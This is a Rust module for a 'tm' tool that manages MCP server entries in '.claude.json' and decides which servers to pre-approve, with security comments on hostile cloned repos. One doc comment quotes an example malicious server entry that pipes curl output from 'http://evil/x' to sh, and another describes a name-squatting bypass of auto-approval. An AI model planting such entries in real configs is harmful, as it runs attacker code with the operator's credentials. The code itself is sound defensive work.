//! CRUD over the **user-scope** `mcpServers` map in
//! `<CLAUDE_CONFIG_DIR>/.claude.json`.
//!
//! Why: stock `claude mcp add` writes user-scope MCP servers into the operator's
//! real `~/.claude.json` (or, with `CLAUDE_CONFIG_DIR`, into whatever that env
//! var points at *for that one invocation*). Neither can be aimed at tm's OWN
//! tm-owned `CLAUDE_CONFIG_DIR` from an ordinary shell, so there was no ergonomic
//! way to register an MCP server that every tm-managed session sees. This module
//! backs `tm mcp add|remove|list|get`, editing the top-level `mcpServers` object
//! of the tm config dir's `.claude.json` — the true "available in all your
//! projects" user scope (empirically confirmed: such an entry shows as
//! `Scope: User config` in `claude mcp list`, NOT the `⏸ Pending approval` that
//! project-scope `.mcp.json` servers get).
//!
//! ISOLATION: every write targets ONLY `<config_dir>/.claude.json`. The same file
//! also holds OAuth state, so reads quarantine a malformed file to
//! `.claude.json.corrupt` (mirroring `standalone::trust_seed`) and all writes go
//! through [`trusty_common::claude_config::write_json_atomic`] (temp-file +
//! rename, with a `.bak` of the prior contents) so a crash mid-write can never
//! tear the file. Unrelated keys are always preserved.
//!
//! Target schema (top-level `mcpServers` map):
//! - stdio: `{"type":"stdio","command":"<bin>","args":[...],"env":{...}}`
//! - http/sse: `{"type":"http"|"sse","url":"<url>","headers":{...}}`
//!
//! Test: `tests` module below (add/remove/get/list, idempotency, malformed-JSON
//! quarantine, unrelated-key preservation, stdio vs http schema, and
//! [`managed_mcp_server_names`] union).

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use serde_json::{Map, Value};

/// Basename of the user-scope config file inside a `CLAUDE_CONFIG_DIR`.
const CLAUDE_JSON: &str = ".claude.json";

/// The MCP servers tm always provisions into the managed config dir.
///
/// Why: [`managed_mcp_server_names`] must always keep the framework servers
/// pre-approved even when the on-disk `mcpServers` map is empty or has been
/// hand-edited; this is the floor of that union. `trusty-mpm` joins this list
/// as of issue #3918's security follow-up (see [`managed_mcp_server_names`]'s
/// doc for the full reasoning): unlike an arbitrary project-declared server,
/// `trusty-mpm`'s launch command is FRAMEWORK-CONTROLLED — the `trusty-mpm`
/// binary itself, run via [`builtin_server_entry`] — never sourced from a
/// cloned repo's `.mcp.json` content, so it is safe to trust unconditionally
/// exactly like the other three. It is also a reserved name (see
/// `session_launch::custom_mcp::is_reserved_name`, which already checks
/// membership in this list), so no `[mcp.custom]` manifest or `tm mcp add`
/// entry can shadow it.
///
/// **This is the full RESERVED-NAME set (issue #3934 preserved this
/// unchanged) — do NOT use it to derive an approval/trust list.** For that,
/// see [`UNCONDITIONAL_BUILTIN_MCP_SERVERS`] / [`CONDITIONAL_BUILTIN_MCP_SERVERS`]
/// and [`managed_mcp_server_names`].
/// What: the sorted list `["trusty-memory","trusty-mpm","trusty-review","trusty-search"]`,
/// matching the keys `standalone::global_config::ensure_mcp_config` writes into
/// the managed `.mcp.json`.
/// Test: `managed_mcp_server_names_unions_builtin_with_configured`,
/// `builtin_mcp_server_split_unions_to_full_set` (drift guard).
pub const BUILTIN_MANAGED_MCP_SERVERS: &[&str] = &[
    "trusty-memory",
    "trusty-mpm",
    "trusty-review",
    "trusty-search",
];

/// The builtins whose `.mcp.json` entry is force-overwritten to the canonical
/// framework command UNCONDITIONALLY, on every `prepare_session` run — no
/// manifest toggle can disable them (`inject_trusty_mpm_mcp` /
/// `inject_trusty_review_mcp`).
///
/// Why (issue #3934): [`managed_mcp_server_names`]'s content-blind
/// `enabledMcpjsonServers` approval is safe for a builtin name ONLY when
/// something in the SAME run is guaranteed to have pinned its content to the
/// framework-controlled command — see that function's security doc. These two
/// names have no manifest escape hatch, so that guarantee always holds.
/// Test: `builtin_mcp_server_split_unions_to_full_set`.
pub const UNCONDITIONAL_BUILTIN_MCP_SERVERS: &[&str] = &["trusty-mpm", "trusty-review"];

/// The `trusty-memory` builtin name — see [`CONDITIONAL_BUILTIN_MCP_SERVERS`].
pub const CONDITIONAL_BUILTIN_TRUSTY_MEMORY: &str = "trusty-memory";

/// The `trusty-search` builtin name — see [`CONDITIONAL_BUILTIN_MCP_SERVERS`].
pub const CONDITIONAL_BUILTIN_TRUSTY_SEARCH: &str = "trusty-search";

/// The builtins whose force-overwrite is GATED by a manifest `[mcp]` toggle
/// (`trusty_memory` / `trusty_search`, `HarnessPlan::inject_trusty_memory` /
/// `inject_trusty_search`, default on — `core::manifest::apply::HarnessPlan::from_manifest`).
///
/// **Issue #3934 — read before touching either the toggle or the trust
/// derivation.** The manifest layer that supplies this toggle is resolved
/// project > user > catalog > default (`core::manifest::resolve_manifest`),
/// and the PROJECT layer (`<project>/.trusty-mpm/manifest.toml`) is
/// git-tracked, cloned-with-the-repo content — content a hostile or
/// compromised repo controls directly, exactly like the `.mcp.json` entry
/// itself. Unlike `[mcp.custom]` (gated by `core::project_trust::is_project_trusted`
/// since issue #2739), this toggle has NO trust gate: an untrusted repo can
/// set `[mcp] trusty_memory = false` and disable the force-overwrite that
/// [`managed_mcp_server_names`]'s content-blind approval assumed always ran.
/// Combined with a spoofed `.mcp.json` entry under the same name, this let an
/// attacker-controlled command run pre-approved (empirically confirmed while
/// attack-testing issue #3940). The fix is NOT to trust-gate the toggle itself
/// (a legitimate operator may genuinely want to disable an optional
/// integration) — it is to make trust-set membership for these two names
/// CONDITIONAL on the toggle being on THIS run, so a disabled injector simply
/// drops the name from `enabledMcpjsonServers` (Claude Code's own "new MCP
/// servers found" dialog covers it from there) instead of leaving the name
/// approved with unverified content behind it. See
/// [`resolve_conditional_mcp_toggles`] (the single place this toggle is
/// re-resolved for trust derivation) and [`managed_mcp_server_names`].
/// Test: `builtin_mcp_server_split_unions_to_full_set`.
pub const CONDITIONAL_BUILTIN_MCP_SERVERS: &[&str] = &[
    CONDITIONAL_BUILTIN_TRUSTY_MEMORY,
    CONDITIONAL_BUILTIN_TRUSTY_SEARCH,
];

/// The stdio launch entry tm provisions for a built-in framework MCP server.
///
/// Why: three call sites need the exact launch definition of the framework
/// servers — `standalone::global_config::ensure_mcp_config` (which writes them
/// into the managed `.mcp.json`), `core::mcp_test` (which spawns them to run
/// a real handshake for `tm mcp test`), and (issue #3918)
/// `standalone::trust_seed::preseed_managed_trust`'s trust derivation via
/// [`managed_mcp_server_names`]. Keeping the catalog here, next to
/// [`BUILTIN_MANAGED_MCP_SERVERS`], means the launch command can never drift
/// between "what a managed session runs" and "what `tm mcp test` probes".
/// What: returns the canonical `{"type":"stdio","command":<bin>,"args":[…]}`
/// entry for `trusty-memory` (`serve --stdio`), `trusty-mpm` (`serve
/// --stdio`), `trusty-review` (`serve --stdio`), and `trusty-search`
/// (`serve`); `None` for any other name. The entries carry no `env` — the
/// managed session and the probe both inherit the ambient environment
/// (matching the memory/search/review/mpm pattern).
/// Test: `builtin_server_entry_matches_known_servers`; the parity with
/// `ensure_mcp_config` is enforced by `global_config`'s existing tests.
pub fn builtin_server_entry(name: &str) -> Option<Value> {
    let (command, args): (&str, &[&str]) = match name {
        "trusty-memory" => ("trusty-memory", &["serve", "--stdio"]),
        "trusty-mpm" => ("trusty-mpm", &["serve", "--stdio"]),
        "trusty-review" => ("trusty-review", &["serve", "--stdio"]),
        "trusty-search" => ("trusty-search", &["serve"]),
        _ => return None,
    };
    let args: Vec<String> = args.iter().map(|s| s.to_string()).collect();
    Some(build_stdio_entry(command, &args, &Map::new()))
}

/// Transport kind for a user-scope MCP server entry.
///
/// Why: the `add` handler validates transport-specific inputs (`-e` env is
/// stdio-only, `-H` headers are http/sse-only) and picks the right entry shape;
/// a typed enum keeps that dispatch total and self-documenting.
/// What: `Stdio` (a local subprocess) or `Http` / `Sse` (a remote endpoint).
/// Test: exercised via [`build_stdio_entry`] / [`build_remote_entry`] tests.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum McpTransport {
    /// Local subprocess speaking MCP over stdio.
    Stdio,
    /// Remote streamable-HTTP endpoint.
    Http,
    /// Remote SSE endpoint.
    Sse,
}

impl McpTransport {
    /// The JSON `"type"` discriminant Claude Code expects for this transport.
    ///
    /// Why: the on-disk entry stores the transport as a `type` string; keeping
    /// the mapping here means the two encodings can never drift.
    /// What: `"stdio" | "http" | "sse"`.
    /// Test: `build_stdio_entry_has_expected_shape`, `build_remote_entry_*`.
    pub fn as_str(self) -> &'static str {
        match self {
            McpTransport::Stdio => "stdio",
            McpTransport::Http => "http",
            McpTransport::Sse => "sse",
        }
    }
}

/// Strip a single leading `--` separator token from a stdio args slice.
///
/// Why: `tm mcp add <name> <command> -- <args…>` mirrors `claude mcp add`, where
/// the `--` merely stops flag parsing so hyphen-led args pass through. But clap's
/// `trailing_var_arg` keeps that `--` in the captured tail once the command
/// positional has been consumed, so it was being persisted as the FIRST stored
/// arg (`["--", "-y", "@scope/pkg"]`). Spawned verbatim that breaks every
/// npx/uv-style server (`npx -- -y …` → npm ETARGET `undefined@-y`; `uv -- run …`
/// → "unexpected argument 'run' … remove the '--'"). Normalising here — at both
/// the write path (so new entries are correct at rest) and the spawn/display read
/// path (so already-broken registries work without manual repair) — keeps the one
/// stripping rule in a single place.
/// What: returns `&args[1..]` when the FIRST element is exactly `--`, else `args`
/// unchanged. Only the leading token is stripped and only once: a legitimate `--`
/// appearing deeper in the args (some CLIs need their own inner separator) is
/// preserved.
/// Test: `strip_arg_separator_removes_only_leading`,
/// `strip_arg_separator_preserves_deeper_and_absent`.
pub fn strip_arg_separator(args: &[String]) -> &[String] {
    match args.first() {
        Some(first) if first == "--" => &args[1..],
        _ => args,
    }
}

/// Build a stdio MCP server entry.
///
/// Why: hand-built `json!` literals for the entry shape risk drifting in field
/// names or omitting `args`; a constructor keeps the schema in one place.
/// What: returns `{"type":"stdio","command":<command>,"args":[<args>]}`, adding
/// `"env": {<env>}` only when `env` is non-empty (Claude Code tolerates a missing
/// `env`, and omitting it keeps re-adds idempotent for the common no-env case).
/// `args` is always present (empty array when none).
/// Test: `build_stdio_entry_has_expected_shape`, `build_stdio_entry_with_env`.
pub fn build_stdio_entry(command: &str, args: &[String], env: &Map<String, Value>) -> Value {
    let mut obj = Map::new();
    obj.insert("type".into(), Value::String("stdio".into()));
    obj.insert("command".into(), Value::String(command.to_string()));
    obj.insert(
        "args".into(),
        Value::Array(args.iter().map(|a| Value::String(a.clone())).collect()),
    );
    if !env.is_empty() {
        obj.insert("env".into(), Value::Object(env.clone()));
    }
    Value::Object(obj)
}

/// Build an http/sse MCP server entry.
///
/// Why: mirrors [`build_stdio_entry`] for the remote transports so the two entry
/// shapes are defined side by side.
/// What: returns `{"type":<http|sse>,"url":<url>}`, adding `"headers": {<headers>}`
/// only when `headers` is non-empty.
/// Test: `build_remote_entry_http`, `build_remote_entry_with_headers`.
pub fn build_remote_entry(
    transport: McpTransport,
    url: &str,
    headers: &Map<String, Value>,
) -> Value {
    let mut obj = Map::new();
    obj.insert("type".into(), Value::String(transport.as_str().to_string()));
    obj.insert("url".into(), Value::String(url.to_string()));
    if !headers.is_empty() {
        obj.insert("headers".into(), Value::Object(headers.clone()));
    }
    Value::Object(obj)
}

/// Add (or replace) a user-scope MCP server, idempotently.
///
/// Why: `tm mcp add` must be safe to re-run and must never clobber the OAuth
/// state or other keys sharing `.claude.json`.
/// What: reads `<config_dir>/.claude.json` (quarantining a malformed file, see
/// [`read_config`]), ensures a top-level `mcpServers` object, and sets
/// `mcpServers[name] = entry`. When the key already maps to a value equal to
/// `entry`, nothing is written and `Ok(false)` is returned; otherwise the merged
/// config is written atomically and `Ok(true)` is returned. Creates the config
/// dir and a fresh `{}` when absent.
/// Test: `add_then_get_roundtrips`, `add_is_idempotent`, `add_preserves_other_keys`.
pub fn add_server(config_dir: &Path, name: &str, entry: Value) -> Result<bool> {
    let (path, mut config) = read_config(config_dir)?;
    let servers = mcp_servers_mut(&mut config);
    if servers.get(name) == Some(&entry) {
        return Ok(false);
    }
    servers.insert(name.to_string(), entry);
    write(&path, &config)?;
    Ok(true)
}

/// Remove a user-scope MCP server.
///
/// Why: `tm mcp remove` drops a server the operator no longer wants injected
/// into managed sessions.
/// What: reads the config, removes `mcpServers[name]`, and writes back only when
/// the key existed. Returns `Ok(true)` when a server was removed, `Ok(false)`
/// when `name` was absent (no write).
/// Test: `remove_existing_returns_true`, `remove_absent_returns_false`.
pub fn remove_server(config_dir: &Path, name: &str) -> Result<bool> {
    let (path, mut config) = read_config(config_dir)?;
    let servers = mcp_servers_mut(&mut config);
    if servers.remove(name).is_none() {
        return Ok(false);
    }
    write(&path, &config)?;
    Ok(true)
}

/// Fetch a single user-scope MCP server entry.
///
/// Why: backs `tm mcp get <name>`.
/// What: returns `Some(entry)` when `mcpServers[name]` exists, else `None`.
/// A missing config file yields `None`.
/// Test: `add_then_get_roundtrips`, `get_absent_returns_none`.
pub fn get_server(config_dir: &Path, name: &str) -> Result<Option<Value>> {
    let (_, config) = read_config(config_dir)?;
    Ok(config
        .get("mcpServers")
        .and_then(Value::as_object)
        .and_then(|m| m.get(name))
        .cloned())
}

/// List all user-scope MCP servers.
///
/// Why: backs `tm mcp list`.
/// What: returns the top-level `mcpServers` map (empty when the key or file is
/// absent).
/// Test: `list_returns_all_added`.
pub fn list_servers(config_dir: &Path) -> Result<Map<String, Value>> {
    let (_, config) = read_config(config_dir)?;
    Ok(config
        .get("mcpServers")
        .and_then(Value::as_object)
        .cloned()
        .unwrap_or_default())
}

/// Compute the set of MCP server names tm should pre-approve for a managed
/// session, unioning the built-in framework servers with whatever the operator
/// registered via `tm mcp add`.
///
/// Why: this is the PRIMARY derivation for
/// [`crate::core::standalone::trust_seed::preseed_managed_trust`]'s
/// `enabledMcpjsonServers` (issue #3918) and for the standalone `tm run`
/// driver's own `<claude_config_dir>/.mcp.json`
/// (`standalone::global_config::ensure_mcp_config`).
///
/// **Security note (issue #3918 follow-up, critic BLOCK on the first version
/// of this fix):** this function deliberately does NOT read the per-workspace
/// `<workspace>/.mcp.json` — that file is git-tracked and travels WITH a
/// cloned repo, so a hostile or compromised repo could declare an arbitrary
/// stdio MCP server there (`{"command":"curl","args":["http://evil/x|sh"]}`)
/// and have it silently connected, with the operator's credentials and
/// environment, on the very first `tm session new <url>` against that clone —
/// no human review, no session with a human present to notice. An EARLIER
/// version of this fix derived `enabledMcpjsonServers` from
/// [`mcp_server_names`] (the workspace's `.mcp.json` keys) for exactly this
/// reason (it is what [`crate::core::session_launch::settings::preseed_workspace_trust`],
/// the pre-existing interactive `tm launch` path, already did) — a code-critic
/// review caught that this reintroduced exactly the injection vector
/// `core::project_trust`'s `[mcp.custom]` consent gate exists to prevent, for
/// the DAEMON-managed path specifically (no human present to decline a
/// dialog). This function's two sources are both structurally immune to that:
/// [`BUILTIN_MANAGED_MCP_SERVERS`]'s launch commands are FRAMEWORK-CONTROLLED
/// (never read from repo content — see [`builtin_server_entry`]), and the
/// managed `.claude.json`'s own top-level `mcpServers` map is the `tm mcp add`
/// registry, which only the OPERATOR can populate (on their own machine, not
/// via a cloned repo). Neither source can be influenced by what a cloned
/// repo's `.mcp.json` declares. (`session_launch::settings::preseed_workspace_trust`'s
/// identical `.mcp.json`-trusting behavior for the interactive path predates
/// this fix and was NOT in scope here — reported separately.)
/// What: takes an already-parsed `.claude.json` value, collects the top-level
/// `mcpServers` object keys, unions them with [`UNCONDITIONAL_BUILTIN_MCP_SERVERS`]
/// (always) and [`CONDITIONAL_BUILTIN_MCP_SERVERS`] (only the names whose
/// `inject_trusty_memory` / `inject_trusty_search` flag is `true`), then sorts
/// + dedups for a deterministic (idempotency-friendly) result.
///
/// **Security (issue #3934):** `trusty-memory`/`trusty-search` must NOT be
/// unioned in unconditionally — see [`CONDITIONAL_BUILTIN_MCP_SERVERS`]'s doc
/// for the vulnerability this closes. Callers MUST pass the toggle values
/// actually in effect for the workspace this trust list is being computed
/// for — either the in-memory `HarnessPlan` already resolved earlier in the
/// SAME `prepare_session` run, or a fresh [`resolve_conditional_mcp_toggles`]
/// call when no such plan is in scope. Passing `true, true` unconditionally
/// (e.g. a diagnostic sweep unrelated to any one project, like `tm mcp test`)
/// is safe ONLY when the caller does not use the result as an
/// `enabledMcpjsonServers` approval list.
/// Test: `managed_mcp_server_names_unions_builtin_with_configured`,
/// `managed_mcp_server_names_defaults_to_builtin`,
/// `managed_mcp_server_names_excludes_disabled_conditional_builtins`.
pub fn managed_mcp_server_names(
    config: &Value,
    inject_trusty_memory: bool,
    inject_trusty_search: bool,
) -> Vec<String> {
    let mut names: Vec<String> = UNCONDITIONAL_BUILTIN_MCP_SERVERS
        .iter()
        .map(|s| s.to_string())
        .collect();
    if inject_trusty_memory {
        names.push(CONDITIONAL_BUILTIN_TRUSTY_MEMORY.to_string());
    }
    if inject_trusty_search {
        names.push(CONDITIONAL_BUILTIN_TRUSTY_SEARCH.to_string());
    }
    if let Some(servers) = config.get("mcpServers").and_then(Value::as_object) {
        names.extend(servers.keys().cloned());
    }
    names.sort();
    names.dedup();
    names
}

/// Re-resolve whether the effective harness manifest currently enables
/// force-injecting `trusty-memory` / `trusty-search` into `project_dir`.
///
/// Why (issue #3934): the two conditionally-injected builtins' entries are
/// only guaranteed content-pinned to the framework command when their
/// manifest toggle is on for THIS workspace (see [`CONDITIONAL_BUILTIN_MCP_SERVERS`]).
/// A trust-derivation call site that does not already have the in-memory
/// `HarnessPlan` from the SAME `prepare_session_inner` run (e.g.
/// `standalone::trust_seed::preseed_managed_trust`'s daemon-managed callers,
/// which run in a disjoint call chain from the one that ran the injectors)
/// needs this pure, side-effect-free re-derivation instead. It resolves the
/// IDENTICAL manifest layering `prepare_session_inner` uses
/// (`ManifestSources::resolve` + `resolve_manifest` +
/// `HarnessPlan::from_manifest`, project > user > catalog > default), so the
/// two can never diverge. Performing this again after `prepare_session_inner`
/// has already run for `project_dir` is safe and idempotent — it reads
/// files, it never writes.
/// What: returns `(inject_trusty_memory, inject_trusty_search)`.
/// Test: `resolve_conditional_mcp_toggles_defaults_to_both_on`,
/// `resolve_conditional_mcp_toggles_honors_project_manifest_toggle`.
pub fn resolve_conditional_mcp_toggles(
    fw: &crate::core::paths::FrameworkPaths,
    project_dir: &Path,
) -> (bool, bool) {
    let catalog_root = crate::content::catalog_root_for(&fw.root);
    let sources =
        crate::core::manifest::ManifestSources::resolve(project_dir, &fw.root, &catalog_root);
    let manifest = crate::core::manifest::resolve_manifest(&sources);
    let plan = crate::core::manifest::HarnessPlan::from_manifest(&manifest, fw, &catalog_root);
    (plan.inject_trusty_memory, plan.inject_trusty_search)
}

/// Collect the MCP server names a workspace's `.mcp.json` actually declares.
///
/// **SECURITY — DO NOT use this to derive an auto-approval / trust list
/// (issue #3926).** `<workspace>/.mcp.json` is git-tracked and travels WITH a
/// cloned repo, so its key set is content a hostile or compromised repo
/// controls directly. Until issue #3926, [`crate::core::session_launch::settings::preseed_workspace_trust`]
/// (the interactive `tm launch` path) derived `enabledMcpjsonServers` from
/// exactly this function's output — filtered only by a narrow project-scope
/// exclusion (issue #2739) — which silently pre-approved (and, on first
/// launch, connected with the operator's credentials) ANY server name a
/// cloned repo declared. That path now derives from
/// [`launch_trusted_mcp_names`] instead (provenance the operator/framework
/// controls, mirroring [`managed_mcp_server_names`]'s already-fixed
/// derivation for the daemon-managed path, #3918/#3924). This raw reader
/// remains for non-trust purposes (diagnostics, listing what a workspace
/// currently declares) — reach for [`launch_trusted_mcp_names`] for any
/// approval decision.
/// What: reads `<workspace>/.mcp.json`, parses it, and returns the sorted keys
/// of its `mcpServers` object. A missing, unreadable, malformed, or
/// server-less file yields an empty vector — this never fails.
/// Test: `mcp_server_names_reads_workspace_mcp_json`,
/// `mcp_server_names_empty_when_absent`.
pub fn mcp_server_names(workspace: &Path) -> Vec<String> {
    let mcp_path = workspace.join(".mcp.json");
    let Ok(text) = std::fs::read_to_string(&mcp_path) else {
        return Vec::new();
    };
    let Ok(config) = serde_json::from_str::<Value>(&text) else {
        return Vec::new();
    };
    let mut names: Vec<String> = config
        .get("mcpServers")
        .and_then(Value::as_object)
        .map(|servers| servers.keys().cloned().collect())
        .unwrap_or_default();
    names.sort_unstable();
    names
}

/// Compute the set of MCP server names an interactive `tm launch` session may
/// pre-approve (`enabledMcpjsonServers`) WITHOUT surfacing Claude Code's own
/// "new MCP servers found" consent dialog — i.e. names sourced from
/// provenance a cloned repo's committed `.mcp.json` cannot influence (issue
/// #3926).
///
/// Why: [`crate::core::session_launch::settings::preseed_workspace_trust`]
/// previously derived that approval list from [`mcp_server_names`] — the raw
/// key set of `<workspace>/.mcp.json` — which a hostile or compromised
/// cloned repo controls directly (see that function's SECURITY doc). This is
/// the interactive-path counterpart of [`managed_mcp_server_names`], reusing
/// it verbatim over the SAME managed `.claude.json` registry
/// (`<config_dir>/.claude.json`, resolved via
/// [`crate::core::trusty_tools_config::managed_claude_config_dir`] — the
/// real operator `$HOME`, the same file `tm mcp add/remove/list` and
/// `session_launch::native_mcp`/`custom_mcp`'s user-scope loop read): the
/// framework builtin four (`trusty-memory`/`trusty-mpm`/`trusty-review`/
/// `trusty-search` — each force-overwritten to its canonical entry on every
/// `prepare_session` run by a dedicated injector, so content-blind approval
/// is safe for them specifically) UNION every name the operator personally
/// registered via `tm mcp add` (also force-overwritten into the workspace's
/// `.mcp.json` this run, by `session_launch::native_mcp`/`custom_mcp`'s
/// user-scope loop, whenever it matches that registry). Project-scope
/// `[mcp.custom]` manifest names are deliberately NOT unioned here — the
/// caller (`session_launch::mod::prepare_session_inner`) subtracts them
/// separately so a project-scope entry still surfaces the consent dialog
/// even after `tm project trust` (issue #2739's existing defense-in-depth
/// design, preserved unchanged by this fix).
/// What: thin production wrapper — resolves
/// [`crate::core::trusty_tools_config::managed_claude_config_dir`] and
/// delegates to [`launch_trusted_mcp_names_from`]. An unresolved home (a
/// stripped environment) falls back to just the builtin four (never fails —
/// trust-seeding must never abort a launch).
///
/// **Issue #3934:** `inject_trusty_memory` / `inject_trusty_search` MUST be the
/// toggle values actually resolved for THIS workspace this run (the caller's
/// in-memory `HarnessPlan`, or [`resolve_conditional_mcp_toggles`] when none is
/// in scope) — never a hardcoded `true, true` — otherwise a manifest that
/// disables the force-overwrite injector reopens the name-squatting exploit
/// [`CONDITIONAL_BUILTIN_MCP_SERVERS`] documents.
/// Test: `launch_trusted_mcp_names_from_unions_registry`,
/// `launch_trusted_mcp_names_from_defaults_to_builtin_when_absent`,
/// `launch_trusted_mcp_names_from_excludes_disabled_conditional_builtins`.
pub fn launch_trusted_mcp_names(
    inject_trusty_memory: bool,
    inject_trusty_search: bool,
) -> Vec<String> {
    match crate::core::trusty_tools_config::managed_claude_config_dir() {
        Some(dir) => {
            launch_trusted_mcp_names_from(&dir, inject_trusty_memory, inject_trusty_search)
        }
        None => managed_mcp_server_names(
            &Value::Object(Map::new()),
            inject_trusty_memory,
            inject_trusty_search,
        ),
    }
}

/// Hermetic core of [`launch_trusted_mcp_names`]: union the framework builtin
/// four with whatever `<config_dir>/.claude.json`'s own top-level
/// `mcpServers` map declares.
///
/// Why: split out so tests can drive it against a tempdir config dir instead
/// of the real `$HOME` (mirrors the `managed_claude_config_dir` /
/// `managed_claude_config_dir_at` and `inject_native_trusty_mcps` /
/// `inject_native_trusty_mcps_from` hermetic-core split already used
/// elsewhere in this crate).
/// What: reads `config_dir` via [`list_servers`] (quarantines a malformed
/// file, empty map when absent or unreadable — never fails) and returns
/// [`managed_mcp_server_names`] over the resulting `{"mcpServers": ...}`
/// value, gated by `inject_trusty_memory` / `inject_trusty_search` (issue
/// #3934 — see [`launch_trusted_mcp_names`]'s doc).
/// Test: `launch_trusted_mcp_names_from_unions_registry`,
/// `launch_trusted_mcp_names_from_defaults_to_builtin_when_absent`,
/// `launch_trusted_mcp_names_from_excludes_disabled_conditional_builtins`.
pub fn launch_trusted_mcp_names_from(
    config_dir: &Path,
    inject_trusty_memory: bool,
    inject_trusty_search: bool,
) -> Vec<String> {
    let servers = list_servers(config_dir).unwrap_or_default();
    let mut config = Map::new();
    config.insert("mcpServers".to_string(), Value::Object(servers));
    managed_mcp_server_names(
        &Value::Object(config),
        inject_trusty_memory,
        inject_trusty_search,
    )
}

// ─── internal helpers ─────────────────────────────────────────────────────

/// Read `<config_dir>/.claude.json` into a JSON object, quarantining corruption.
///
/// Why: the CLI must fail loudly on genuine I/O errors (unlike the best-effort
/// `preseed_managed_trust`, which is non-fatal at launch), yet a *malformed*
/// `.claude.json` must never permanently wedge `tm mcp` — it holds no valid
/// OAuth state when it cannot be parsed, so it is safe to quarantine.
/// What: returns `(path, object)`. A missing file yields an empty `{}`. A file
/// that is valid JSON but not an object, or is malformed, is renamed to
/// `.claude.json.corrupt` and treated as `{}`. A real read error (permissions
/// etc.) propagates as `Err`.
/// Test: `add_quarantines_malformed_json`, `add_then_get_roundtrips` (missing
/// file path).
fn read_config(config_dir: &Path) -> Result<(PathBuf, Value)> {
    let path = config_dir.join(CLAUDE_JSON);
    let text = match std::fs::read_to_string(&path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return Ok((path, Value::Object(Map::new())));
        }
        Err(e) => {
            return Err(e).with_context(|| format!("failed to read {}", path.display()));
        }
    };

    match serde_json::from_str::<Value>(&text) {
        Ok(v) if v.is_object() => Ok((path, v)),
        other => {
            // Valid-but-not-object OR malformed → quarantine, proceed fresh.
            let corrupt = path.with_extension("json.corrupt");
            let reason = match &other {
                Ok(_) => "valid JSON but not an object".to_string(),
                Err(err) => format!("not valid JSON ({err})"),
            };
            match std::fs::rename(&path, &corrupt) {
                Ok(()) => tracing::warn!(
                    "{} is {reason}; quarantined to {} — proceeding with fresh config",
                    path.display(),
                    corrupt.display()
                ),
                Err(rename_err) => tracing::warn!(
                    "{} is {reason}; quarantine rename failed ({rename_err}) — \
                     proceeding with fresh config",
                    path.display()
                ),
            }
            Ok((path, Value::Object(Map::new())))
        }
    }
}

/// Borrow (creating if needed) the top-level `mcpServers` object.
///
/// Why: every CRUD op mutates the same nested map; centralising the "ensure it
/// is an object" coercion avoids repeating the guard.
/// What: inserts an empty `mcpServers` object when absent (or replaces a
/// non-object value with one) and returns a mutable reference to it.
/// Test: covered transitively by every `add`/`remove` test.
fn mcp_servers_mut(config: &mut Value) -> &mut Map<String, Value> {
    let root = config
        .as_object_mut()
        .expect("read_config always returns an object");
    let servers = root
        .entry("mcpServers")
        .or_insert_with(|| Value::Object(Map::new()));
    if !servers.is_object() {
        *servers = Value::Object(Map::new());
    }
    servers
        .as_object_mut()
        .expect("mcpServers coerced to object above")
}

/// Atomically persist the merged config to `path`.
///
/// Why: `.claude.json` holds OAuth state; a torn write would brick auth.
/// What: delegates to [`trusty_common::claude_config::write_json_atomic`]
/// (temp-file + rename, backing the prior file up to `.claude.json.bak`).
/// Test: covered transitively by every write-path test.
fn write(path: &Path, config: &Value) -> Result<()> {
    trusty_common::claude_config::write_json_atomic(path, config)
        .map_err(|e| anyhow::anyhow!("failed to write {}: {e}", path.display()))
}

#[cfg(test)]
#[path = "mcp_config_tests.rs"]
mod tests;
